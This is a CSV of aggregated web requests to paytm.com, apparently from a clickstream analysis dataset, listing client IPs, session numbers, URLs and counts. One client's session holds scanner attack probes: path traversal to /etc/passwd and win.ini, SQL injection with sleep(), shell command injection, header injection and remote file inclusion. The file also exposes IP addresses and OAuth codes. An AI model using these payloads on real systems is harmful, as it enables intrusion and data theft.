clientIp,sessionId,request,count(request)
14.139.61.212,44,https://paytm.com:443/papi/v1/expresscart/verify,3
14.141.23.154,46,https://paytm.com:443/,1
180.188.253.70,54,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/flexslider/flexslider.css?ver=2.2.0,1
182.66.19.196,54,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
182.66.19.196,54,https://paytm.com:443/offer/wp-content/uploads/2015/07/logo42.gif,1
182.66.19.196,54,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=1&channel=web&version=2,1
193.202.110.180,59,http://paytm.com:80/shop/g/electronics/mobile-accessories/mobiles-accessories-store/carousel/bluetooth-headset-flat-50-off,2
203.90.124.66,64,https://paytm.com:443/images/greyStar.png,1
218.248.11.188,70,https://paytm.com:443/,1
66.102.6.250,81,https://paytm.com:443/contactus,1
66.102.6.250,82,https://paytm.com:443/shop/g/women/the-women-s-store/top-carousal/lingerie-nightwear-flat-70-off,1
1.187.236.169,0,https://paytm.com:443/shop/login?isIframe=true&theme=mp-web,2
103.24.124.194,9,https://paytm.com:443/shop/cart,1
106.78.8.94,16,https://paytm.com:443/shop/wallet/balance,1
111.93.169.242,18,https://paytm.com:443/shop/cart,4
115.111.145.134,20,https://paytm.com:443/papi/v1/promosearch/product/7363061/offers?parent_id=13499086&price=1699&channel=web&version=2,1
115.112.60.190,22,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/js/jquery.jcarousel.min.js?ver=4.2.2,1
115.112.60.190,22,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/slider-plus-lightbox-js.js?ver=4.2.2,1
115.118.207.238,22,https://paytm.com:443/shop/orderdetail/1095049926?actions=1&channel=web&version=2,1
117.204.133.80,24,https://paytm.com:443/shop/authresponse?code=4672bbf2-c044-4262-b8a9-8355dffab2b9&state=null,1
117.205.177.87,24,https://paytm.com:443/offer/wp-content/plugins/really-simple-facebook-twitter-share-buttons/style.css?ver=4.2.2,1
122.161.17.186,29,https://paytm.com:443/papi/nps/merchantrating?merchant_id=30843&channel=web&version=2,1
122.169.146.157,31,https://paytm.com:443/papi/rr/products/10327658/statistics?channel=web&version=2,1
14.97.48.207,38,https://paytm.com:443/papi/rr/products/13056781/statistics?channel=web&version=2,1
14.98.12.79,38,https://paytm.com:443/papi/nps/merchantrating?merchant_id=50996&channel=web&version=2,1
144.36.210.229,38,https://paytm.com:443/offer/wp-content/uploads/2015/07/ggg.jpg,1
163.47.12.167,45,https://paytm.com:443/shop/cart?channel=web&version=2,1
195.154.169.209,57,https://paytm.com:443/shop/h/electronics?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff12,1
202.153.44.112,57,https://paytm.com:443/papi/v1/promosearch/product/1856586/offers?parent_id=17469057&price=899&channel=web&version=2,1
223.225.252.221,64,https://paytm.com:443/shop/p/levi-s-men-511-light-blue-slim-fit-jeans-size-38-APPLEVI-S-MEN-5YOUR21247A25B453E,1
49.202.44.165,76,https://paytm.com:443/shop/user/address,1
49.207.24.25,77,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,4
1.22.73.220,0,https://paytm.com:443/styles/app.css,1
106.208.114.120,8,https://paytm.com:443/shop/orderdetail/1117785925,1
106.78.188.242,10,https://paytm.com:443/blog/wp-content/plugins/akismet/_inc/form.js?ver=3.1.1,1
111.93.133.74,16,https://paytm.com:443/myorders/1116500897,1
116.202.164.226,23,https://paytm.com:443/shop/cart?channel=web&version=2,5
122.164.174.9,34,https://paytm.com:443/papi/rr/products/7578664/statistics?channel=web&version=2,1
122.169.26.242,34,https://paytm.com:443/offer/wp-includes/js/jquery/ui/dialog.min.js?ver=1.11.4,1
122.179.105.29,34,https://paytm.com:443/shop/p/pantaloons-black-cotton-leggings-size-30-APPPANTALOONS-BTREN5099670E92917,1
124.153.107.68,36,https://paytm.com:443/papi/rr/products/8819604/statistics?channel=web&version=2,1
14.102.94.47,40,https://paytm.com:443/offer/wp-content/uploads/2015/07/ledq.jpg,1
14.140.109.65,44,https://paytm.com:443/shop/orderdetail/1100930253?actions=1&channel=web&version=2,1
14.141.134.162,44,https://paytm.com:443/papi/v1/promosearch/product/13155037/offers?parent_id=13155040&price=369&channel=web&version=2,2
14.99.94.18,46,https://paytm.com:443/offer/wp-content/uploads/2015/07/bargain.jpg,1
15.219.201.80,48,https://paytm.com:443/papi/rr/products/4246285/statistics?channel=web&version=2,1
167.88.13.38,55,https://paytm.com:443/shop/g/electronics/computers-accessories/laptops?utm_source=Affiliates&utm_medium=OMG&utm_campaign=OMG&utm_term=683625_SNAME,1
175.101.67.232,67,https://paytm.com:443/,1
175.101.67.232,67,https://paytm.com:443/offer/wp-includes/js/masonry.min.js?ver=3.1.2,1
203.91.215.55,73,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,4
223.30.12.238,76,https://paytm.com:443/papi/nps/merchantrating?merchant_id=21695&channel=web&version=2,1
49.207.247.167,79,https://paytm.com:443/papi/v1/promosearch/product/16663351/offers?parent_id=223958&price=37189&channel=web&version=2,1
59.160.74.254,81,https://paytm.com:443/offer/wp-content/uploads/2015/07/bedlinen.jpg,1
70.39.187.188,81,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/js/l-box-js.js?ver=4.2.2,1
8.37.225.11,84,https://paytm.com:443/offer/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4,1
8.37.226.226,86,https://paytm.com:443/offer/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4,1
8.37.226.226,86,https://paytm.com:443/offer/wp-includes/js/wp-emoji-release.min.js?ver=4.2.2,1
8.37.228.9,87,https://paytm.com:443/blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1,1
1.23.48.109,0,https://paytm.com:443/papi/v1/promosearch/product/3588636/offers?parent_id=0&price=585&channel=web&version=2,1
1.39.12.167,6,https://paytm.com:443/shop/cart,4
101.222.251.139,13,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,1
103.15.249.113,14,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/flexslider/flexslider.css?ver=2.2.0,1
106.216.153.157,34,https://paytm.com:443/images/greyStar.png,1
106.66.58.200,34,https://paytm.com:443/apple-touch-icon-120x120.png,1
115.254.25.186,51,https://paytm.com:443/shop/cart?channel=web&version=2,3
116.203.141.199,52,https://paytm.com:443/papi/nps/merchantrating?merchant_id=57302&channel=web&version=2,1
117.206.137.197,53,https://paytm.com:443/shop/p/basics-red-cotton-and-linen-casual-shirt-size-xxl-APPBASICS-RED-CBASI20086ACEA9AB0,1
117.239.91.155,53,https://paytm.com:443/blog/wp-content/plugins/jetpack/_inc/genericons/genericons/Genericons.eot,1
117.239.91.155,53,https://paytm.com:443/offer/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4,1
117.253.232.210,53,https://paytm.com:443/shop?utm_source=affiliates&utm_medium=icubeswire&utm_campaign=icubeswire&utm_term=10480,1
14.98.107.76,78,https://paytm.com:443/shop/cart?channel=web&version=2,1
14.98.88.186,78,https://paytm.com:443/papi/v1/promosearch/product/10990156/offers?parent_id=0&price=450&channel=web&version=2,1
14.99.113.11,78,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
182.69.196.243,88,https://paytm.com:443/papi/nps/merchantrating?merchant_id=21832&channel=web&version=2,1
182.71.161.138,90,https://paytm.com:443/shop/orderdetail/1090146440?actions=1&channel=web&version=2,2
182.73.71.194,91,https://paytm.com:443/offer/wp-includes/js/wp-emoji-release.min.js?ver=4.2.2,1
182.74.170.18,91,https://paytm.com:443/offer/wp-includes/js/jquery/ui/accordion.min.js?ver=1.11.4,1
220.226.206.7,100,https://paytm.com:443/recharges/401480320150722130402,1
220.226.206.7,102,https://paytm.com:443/recharges/401992420150722173603,1
220.226.206.7,103,https://paytm.com:443/recharges/403124620150722192025,1
220.226.206.7,103,https://paytm.com:443/recharges/403044520150722191057,1
220.226.206.7,103,https://paytm.com:443/recharges/401438120150722171036,1
220.226.206.7,104,https://paytm.com:443/recharges/402983820150722190721,1
220.226.206.7,104,https://paytm.com:443/recharges/403051220150722191142,1
223.176.57.249,107,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/styles.css?ver=4.2.2,1
49.204.201.136,111,https://paytm.com:443/papi/v1/promosearch/product/9358900/offers?parent_id=9358908&price=885&channel=web&version=2,1
49.204.218.28,111,https://paytm.com:443/shop/orderdetail/1118045609?channel=web&version=2,1
61.12.88.182,114,https://paytm.com:443/api/oauth2/user/clients?channel=web&version=2,1
61.3.15.51,116,https://paytm.com:443/offer/wp-includes/js/wp-emoji-release.min.js?ver=4.2.2,1
61.3.28.3,116,https://paytm.com:443/papi/nps/merchantrating?merchant_id=21637&channel=web&version=2,4
1.186.197.80,0,https://paytm.com:443/papi/nps/merchantrating?merchant_id=23366&channel=web&version=2,1
1.186.197.80,0,https://paytm.com:443/shop/p/faith-black-heels-size-9-FOOFAITH-BLACK-FAIT330722C8F606E,1
1.22.38.150,2,https://paytm.com:443/papi/nps/merchantrating?merchant_id=69013&channel=web&version=2,1
101.57.5.108,7,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,2
103.24.22.162,8,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/css/style-admin.css?ver=4.2.2,1
106.208.248.63,9,https://paytm.com:443/offer/wp-content/uploads/2015/07/bb.png,1
106.216.147.1,9,https://paytm.com:443/shop/labels?vertical_id=36&item_status=28&channel=web&details=1&version=2,1
112.79.36.78,11,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
115.119.114.242,12,https://paytm.com:443/shop/cart?channel=web&version=2,1
115.254.12.69,15,https://paytm.com:443/shop/p/videocon-vkc50fh-50-inch-led-tv-full-hd-LARVIDEOCON-VKCELEC31845EA99B842,1
116.199.173.2,20,https://paytm.com:443/shop?utm_source=affiliate&utm_medium=promocodeclub&utm_campaign=promocodeclub-generic&utm_term=pccptm,3
117.208.83.247,21,https://paytm.com:443/shop/orderhistory?pagesize=10&channel=web&version=2,1
117.212.5.151,21,https://paytm.com:443/shop/logout?channel=web&version=2,1
117.252.49.223,22,https://paytm.com:443/offer/wp-content/themes/twentytwelve/style.css?ver=4.2.2,1
117.253.221.241,22,https://paytm.com:443/shop/cart?channel=web&version=2,1
117.255.246.225,23,https://paytm.com:443/shop/h/electronics?utm_term=1,1
121.244.155.100,27,https://paytm.com:443/blog/secured-2-step-authentication-login-on-paytms-website/,1
122.170.100.152,30,https://paytm.com:443/papi/v1/promosearch/product/6033535/offers?parent_id=0&price=199&channel=web&version=2,1
125.19.44.195,37,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/css/style-admin.css?ver=4.2.2,1
14.139.241.84,45,https://paytm.com:443/offer/wp-content/uploads/2015/07/meruwer_1.jpg,2
183.87.39.242,70,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/js/jquery.jcarousel.min.js?ver=4.2.2,1
183.87.39.242,70,https://paytm.com:443/offer/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4,1
59.92.249.152,95,https://paytm.com:443/papi/v1/promosearch/product/14504391/offers?parent_id=14504392&price=1298&channel=web&version=2,1
101.2.37.28,7,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/css/slider-plus-lightbox-style.css?ver=4.2.2,1
101.56.25.232,7,https://paytm.com:443/shop/cart?channel=web&version=2,1
103.16.71.67,7,https://paytm.com:443/offer/wp-includes/js/comment-reply.min.js?ver=4.2.2,1
103.245.197.114,16,https://paytm.com:443/,3
107.167.108.128,27,https://paytm.com:443/paytmcash,1
115.241.52.13,34,https://paytm.com:443/offer/wp-content/plugins/wp-awesome-faq/accordion.js?ver=1,1
117.216.245.42,35,https://paytm.com:443/shop/summary/1116222768,1
121.241.127.1,37,https://paytm.com:443/offer/wp-content/uploads/2015/06/but_1.png,1
122.164.203.16,40,https://paytm.com:443/papi/v1/expresscart/verify,1
125.19.58.217,42,https://paytm.com:443/offer/wp-content/uploads/2015/07/470X220_books.jpg,1
14.139.221.18,42,https://paytm.com:443/shop/cart?channel=web&version=2,1
203.187.254.234,66,https://paytm.com:443/papi/v1/promosearch/product/4472737/offers?parent_id=0&price=900&channel=web&version=2,1
37.228.107.226,75,https://paytm.com:443/offer/wp-content/uploads/2015/05/zovi.jpg,2
1.39.14.209,3,https://paytm.com:443/,1
101.212.71.193,6,https://paytm.com:443/shop/orderdetail/1118177985,1
101.212.72.70,6,https://paytm.com:443/shop/orderdetail/1116642972?channel=web&version=2,1
107.167.109.10,13,https://paytm.com:443/styles/app.css,1
116.202.36.59,19,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/slider-plus-lightbox-js.js?ver=4.2.2,1
117.195.192.2,20,https://paytm.com:443/papi/v1/promosearch/product/7546639/offers?parent_id=12913112&price=4999&channel=web&version=2,1
117.201.177.66,22,https://paytm.com:443/papi/rr/products/11383437/statistics?channel=web&version=2,1
14.139.245.2,34,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/css/jquery.lbox.css?ver=4.2.2,1
14.140.150.250,37,https://paytm.com:443/,1
14.99.224.78,42,https://paytm.com:443/favicon.ico,1
168.235.197.48,57,https://paytm.com:443/blog/wp-includes/js/comment-reply.min.js?ver=4.2.2,1
182.68.166.57,64,https://paytm.com:443/,1
223.176.52.3,74,https://paytm.com:443/offer/wp-content/plugins/wonderplugin-carousel/engine/wonderplugincarousel.js?ver=3.8,1
223.225.214.251,74,https://paytm.com:443/shop/p/high-sierra-red-line-and-charcoal-backpack-BAGHIGH-SIERRA-VIRA20338B244391F?utm_source=Affiliates&utm_medium=OMG&utm_campaign=OMG&utm_term=420791_,1
59.177.1.124,82,https://paytm.com:443/papi/rr/products/7546719/statistics?channel=web&version=2,1
1.39.12.141,2,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/style.css?ver=1.26,1
1.39.12.141,2,https://paytm.com:443/offer/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4,1
101.209.251.32,7,https://paytm.com:443/bus-tickets?webview=1&client=androidapp&version=4.4.3,1
101.222.167.93,7,https://paytm.com:443/shop/cart?channel=web&version=2,1
101.63.173.117,7,https://paytm.com:443/papi/nps/merchantrating?merchant_id=30233&channel=web&version=2,1
106.220.47.195,10,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/css/images-responsive-thumbnail-slider-plus-lighbox-style.css?ver=4.2.2,1
114.30.78.68,25,https://paytm.com:443/papi/v1/promosearch/product/7460827/offers?parent_id=0&price=299&channel=web&version=2,1
117.222.226.32,28,https://paytm.com:443/shop/logout?channel=web&version=2,1
122.169.135.187,33,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.carousel.css?ver=4.2.2,1
14.139.243.114,47,https://paytm.com:443/papi/nps/merchantrating?merchant_id=44399&channel=web&version=2,1
14.139.41.151,51,https://paytm.com:443/shop/logout?channel=web&version=2,3
142.245.193.1,57,https://paytm.com:443/images/greyStar.png,1
142.245.193.1,58,https://paytm.com:443/,1
182.64.165.22,59,https://paytm.com:443/shop/summary/1115766131,1
182.66.41.160,59,https://paytm.com:443/offer/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4,1
182.68.153.138,59,https://paytm.com:443/papi/nps/merchantrating?merchant_id=56253&channel=web&version=2,1
183.82.245.173,61,https://paytm.com:443/papi/nps/merchantrating?merchant_id=22895&channel=web&version=2,1
27.97.160.63,64,https://paytm.com:443/shop/user/address,1
49.14.119.16,65,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/css/jcarouselresponsive.css?ver=4.2.2,1
59.180.139.58,74,https://paytm.com:443/offer/wp-includes/js/jquery/ui/draggable.min.js?ver=1.11.4,1
1.39.96.200,5,https://paytm.com:443/shop/cart,1
106.218.33.101,6,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
106.51.120.74,6,https://paytm.com:443/shop/cart?channel=web&version=2,1
111.91.75.75,16,https://paytm.com:443/offer/wp-content/uploads/2015/07/offer-page_20jul.jpg,1
112.196.47.251,16,https://paytm.com:443/offer/wp-content/uploads/2014/12/slider-pro.min_.css,1
112.79.35.152,21,https://paytm.com:443/offer/wp-content/uploads/2015/05/bg_gg_v1.gif,1
116.202.154.215,24,https://paytm.com:443/shop/cart?channel=web&version=2,1
116.203.73.156,24,https://paytm.com:443/papi/rr/products/2647576/statistics?channel=web&version=2,1
117.218.180.94,28,https://paytm.com:443/shop/cart?channel=web&version=2,1
125.63.68.99,33,https://paytm.com:443/papi/nps/merchantrating?merchant_id=20752&channel=web&version=2,1
141.0.9.92,35,https://paytm.com:443/settings,2
180.215.46.112,40,https://paytm.com:443/shop/g/paytm-home/sweets-chocolates/dry-fruits?utm_source=affiliates&utm_medium=grabon&utm_campaign=grabon,1
180.215.46.112,40,https://paytm.com:443/settings,1
180.215.6.24,40,https://paytm.com:443/shop/cart?channel=web&version=2,1
198.24.6.139,42,https://paytm.com:443/papi/nps/merchantverification,1
203.91.192.4,45,https://paytm.com:443/offer,1
210.212.125.100,49,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,2
27.97.171.90,53,https://paytm.com:443/offer/wp-content/plugins/wp-awesome-faq/accordion.js?ver=1,1
45.115.7.207,57,https://paytm.com:443/shop/cart,1
50.117.41.185,57,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
1.39.80.106,2,https://paytm.com:443/offer/wp-content/plugins/really-simple-facebook-twitter-share-buttons/images/specificfeeds_follow.png,1
103.25.155.202,6,https://paytm.com:443/papi/rr/products/12262938/statistics?channel=web&version=2,1
106.208.190.130,7,https://paytm.com:443/papi/rr/products/9598447/statistics?channel=web&version=2,1
112.133.229.99,11,https://paytm.com:443/shop/g/men/the-men-s-store/innerwear-sleepwear?utm_source=affiliate&utm_medium=innovativelead&utm_campaign=innovativelead-generic&utm_term=26,1
117.199.61.70,17,https://paytm.com:443/shop/cart?channel=web&version=2,1
117.253.107.161,19,https://paytm.com:443/shop/h/electronics?utm_source=Affiliates&utm_medium=VCOMM&utm_campaign=VCOMM-generic&utm_term=1064,2
120.57.146.46,20,https://paytm.com:443/papi/rr/products/8633282/statistics?channel=web&version=2,1
122.165.81.118,21,https://paytm.com:443/shop/summary/1116632463,1
125.18.221.14,23,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/magnific-popup.css?ver=0.9.9,1
14.139.237.40,25,https://paytm.com:443/shop,1
14.140.130.10,25,https://paytm.com:443/dakshin-gujarat-vij-company-limited-bill-payment,1
14.99.96.1,31,https://paytm.com:443/blog/wp-content/plugins/jetpack/css/jetpack.css?ver=3.5.3,1
203.143.186.45,48,https://paytm.com:443/offer/wp-content/uploads/2015/07/pesoal.jpg,1
203.143.186.45,48,https://paytm.com:443/offer/wp-content/uploads/2015/07/470X220_books.jpg,1
49.204.98.122,61,https://paytm.com:443/papi/nps/merchantrating?merchant_id=25898&channel=web&version=2,1
59.89.66.15,65,https://paytm.com:443/shop/cart?channel=web&version=2,1
61.16.177.52,65,https://paytm.com:443/shop/action,1
1.23.154.235,1,https://paytm.com:443/api/user/favourite?channel=web&version=2,1
1.23.37.131,1,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/style.css?ver=1.26,1
1.23.37.131,1,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/css/l-box-css.css?ver=4.2.2,1
100.43.81.132,6,https://paytm.com:443/shop/p/somani-fashion-black-cotton-casual-shirt-CMPLXAPPSOMANI-FASHISOMA36338906B53A6,1
101.63.137.21,8,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,1
103.21.127.78,8,https://paytm.com:443/papi/v1/promosearch/product/11149326/offers?parent_id=4781489&price=691&channel=web&version=2,1
103.21.127.78,8,https://paytm.com:443/papi/rr/products/11424193/statistics?channel=web&version=2,1
103.21.127.78,11,http://www.paytm.com:80/,2
103.21.127.78,12,https://paytm.com:443/papi/v1/promosearch/product/10095989/offers?parent_id=1887893&price=2038&channel=web&version=2,1
103.21.234.155,12,https://paytm.com:443/papi/nps/merchantrating?merchant_id=22225&channel=web&version=2,1
103.233.114.162,13,https://paytm.com:443/papi/v1/promosearch/product/10424017/offers?parent_id=8497673&price=585&channel=web&version=2,1
112.79.35.75,15,https://paytm.com:443/shop/v1/frequentorders,3
113.193.144.108,19,https://paytm.com:443/papi/nps/merchantrating?merchant_id=30711&channel=web&version=2,3
117.240.234.157,29,https://paytm.com:443/papi/nps/merchantrating?merchant_id=23388&channel=web&version=2,1
125.17.16.146,41,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/js/owl.carousel.js?ver=4.2.2,1
14.99.100.214,48,https://paytm.com:443/offer/wp-content/uploads/2015/07/meruwer_1.jpg,1
180.178.28.18,52,https://paytm.com:443/papi/rr/products/14738269/statistics?channel=web&version=2,1
182.19.62.45,54,https://paytm.com:443/shop/orderdetail/1116233029?actions=1&channel=web&version=2,1
203.109.86.38,57,https://paytm.com:443/offer,2
203.147.88.34,60,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/js/l-box-js.js?ver=4.2.2,1
223.176.7.68,69,https://paytm.com:443/papi/rr/products/6809636/statistics?channel=web&version=2,1
223.176.7.68,69,https://paytm.com:443/papi/rr/products/9318246/statistics?channel=web&version=2,1
27.251.201.3,69,https://paytm.com:443/papi/rr/products/13444118/statistics?channel=web&version=2,1
43.224.156.82,76,https://paytm.com:443/offer/wp-content/plugins/images-thumbnail-sliderv1/js/jc.js?ver=4.2.2,1
43.224.156.82,77,https://paytm.com:443/favicon.ico,1
49.206.175.58,80,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.js?ver=1.3,1
61.246.1.50,81,https://paytm.com:443/offer/wp-content/uploads/2015/07/autom.jpg,1
103.16.70.147,2,https://paytm.com:443/shop/h/baby-kids-toys/toys-and-games,1
106.221.139.3,6,https://paytm.com:443/papi/v1/promosearch/product/16919799/offers?parent_id=16919809&price=419&channel=web&version=2,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd-55-cashback-on-bedsheets,1
106.51.132.54,7,https://paytm.com:443/offer/%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_wvs/,1
106.51.132.54,7,https://paytm.com:443/shop/g/electronics/the-electronic-store/upto-rs-1000-%22%26dir%26%22,1
106.51.132.54,7,https://paytm.com:443/shop/h/books-media-stationery/../../../../../../../../../../windows/win.ini%00.jpg,1
106.51.132.54,7,https://paytm.com:443/stores/xmlrpc.php?%27%22,1
106.51.132.54,7,https://paytm.com:443/offer//../..//../..//../..//../..//../..//etc/passwd%00.jpg/,1
106.51.132.54,7,https://paytm.com:443/%7cdir/security/,1
106.51.132.54,7,https://paytm.com:443/shop/h/books-media-stationery/home-and-kitchen-appliances%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20,1
106.51.132.54,7,https://paytm.com:443/shop/%60cat%20%2fetc%2fpasswd%60/brand-store/sports-fitness,1
106.51.132.54,7,https://paytm.com:443/%0a%20SomeCustomInjectedHeader%3ainjected_by_wvs/termsconditions/,1
106.51.132.54,7,https://paytm.com:443/offer/http%3a%2f%2ftestasp.vulnweb.com%2ft%2ffit.txt%3f%2500.jpg/,1
113.21.72.75,16,https://paytm.com:443/shop/cart?channel=web&version=2,3
115.249.127.116,18,https://paytm.com:443/offer/wp-content/themes/twentytwelve/style.css?ver=4.2.2,1
116.202.36.199,19,https://paytm.com:443/papi/v1/promosearch/product/10192429/offers?parent_id=1652435&price=484&channel=web&version=2,1
182.68.121.136,65,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
183.83.8.48,69,https://paytm.com:443/papi/v1/promosearch/product/17563540/offers?parent_id=17563547&price=749&channel=web&version=2,1
223.196.196.32,77,https://paytm.com:443/shop/authresponse?code=2fc7d1b2-c92d-49a2-8300-dfdf9e074c62&state=,1
27.251.249.82,78,"https://paytm.com:443/shop/search/?q=bicycles&brand=2403,116511&price=79,6285",1
49.14.99.236,81,https://paytm.com:443/api/user/favourite?channel=web&version=2,1
54.169.78.51,81,https://paytm.com:443/shop/p/samsung-2600-mah-power-bank-white-SAMSUNG_SAMBANK1_2600MAH_WHITE_21472,1
54.169.78.51,81,https://paytm.com:443/shop/p/apple-iphone-6-CMPLXAPPLE_IPHONE6_16GB_GOLD,1
54.169.78.51,82,https://paytm.com:443/shop/p/gionee-m2-white-GIONEE_M2_4GB_WHITE_22649,1
54.169.78.51,82,https://paytm.com:443/shop/p/ambrane-p-1000-star-10400-mah-power-bank-with-samsung-cells-black-AMBRANE_P-1000STAR_10400MAH_BLACK_27123,1
54.169.78.51,82,https://paytm.com:443/shop/p/nokia-lumia-625-yellow-Nokia_Lumia625_8GB_Yellow_22420,1
54.169.78.51,82,https://paytm.com:443/shop/p/sony-xperia-m2-dual-black-SONY_XPERIAM2DUAL_8GB_BLACK_21318,1
54.169.78.51,82,https://paytm.com:443/shop/p/gionee-m2-8-gb-white-MOBGIONEE-M2-8-SYBE20663ED62C283,1
54.169.78.51,82,https://paytm.com:443/shop/p/lg-magna-h502f-8gb-black-gold-MOBLG-MAGNA-H50NEO-4114483250B7B,1
54.169.78.51,84,https://paytm.com:443/shop/p/transcend-premium-memory-card-16-gb-microsd-class-10-TRANSCEND_MICROSDHCCLASS10_16GB_NULL_21835,1
70.39.187.252,87,https://paytm.com:443/?utm_source=ucweb&utm_medium=Affiliate&utm_campaign=web,1
81.155.50.165,90,https://paytm.com:443/papi/nps/merchantrating?merchant_id=43676&channel=web&version=2,1
1.39.45.249,1,https://paytm.com:443/,1
103.26.225.229,7,https://paytm.com:443/shop/cart,1
112.79.35.209,12,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
112.79.35.209,12,https://paytm.com:443/shop/cart?channel=web&version=2,2
117.194.106.106,15,https://paytm.com:443/shop/authresponse?code=ce33eef8-9787-4a0e-9ad9-12078123f017&state=null,1
117.213.45.57,16,https://paytm.com:443/shop/cart?channel=web&version=2,2
117.213.45.57,16,https://paytm.com:443/images/greyStar.png,1
117.221.102.94,16,https://paytm.com:443/shop/cart?channel=web&version=2,2
117.221.102.94,16,https://paytm.com:443/papi/nps/merchantrating?merchant_id=61323&channel=web&version=2,1
122.165.52.64,21,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,3
122.168.64.179,22,https://paytm.com:443/papi/v1/promosearch/product/12768583/offers?parent_id=5179622&price=7990&channel=web&version=2,1
122.177.48.135,22,https://paytm.com:443/papi/v1/promosearch/product/4044552/offers?parent_id=4045399&price=547&channel=web&version=2,1
122.50.209.31,23,https://paytm.com:443/papi/rr/products/7564890/statistics?channel=web&version=2,1
182.74.14.174,40,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,2
188.40.135.194,43,https://paytm.com:443/papi/v1/promosearch/product/13066538/offers?parent_id=13066642&price=499,1
192.193.164.9,47,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.theme.css?ver=4.2.2,1
223.223.142.12,55,https://paytm.com:443/shop/cart?channel=web&version=2,2
27.97.219.16,58,https://paytm.com:443/,4
43.250.165.224,62,https://paytm.com:443/papi/v1/expresscart/verify,1
